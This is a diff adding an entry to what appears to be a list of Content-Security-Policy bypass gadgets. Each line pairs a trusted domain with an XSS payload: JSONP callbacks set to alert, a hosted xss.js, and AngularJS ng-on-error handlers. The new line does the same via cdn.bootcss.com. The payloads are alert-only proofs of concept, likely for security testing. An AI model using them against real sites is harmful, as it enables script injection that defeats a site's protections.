@@ -50,6 +50,7 @@ bookmark.hatenaapis.com	<script src="https://bookmark.hatenaapis.com/count/entry
 c.y.qq.com	<script src="https://c.y.qq.com/v8/fcg-bin/v8.fcg?&notice=0&format=jsonp&channel=singer&page=list&jsonpCallback=alert"></script>
 cas.criteo.com	<script src="https://cas.criteo.com/delivery/0.1/napi.jsonp?zoneid=377600&callback=alert(1)"></script>
 cdn.arkoselabs.com	<script src="https://cdn.arkoselabs.com/fc/a/?callback=alert"></script>
+cdn.bootcss.com	<script src="https://cdn.bootcss.com/angular.js/1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 cdn.jsdelivr.net	<script src="https://cdn.jsdelivr.net/gh/renniepak/xss/xss.js"></script>
 cdn.jsdelivr.net	<script src="https://cdn.jsdelivr.net/npm/angular@1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 cdn.shopify.com	<script src="https://cdn.shopify.com/s/files/1/0714/7936/1848/files/a.js"></script>
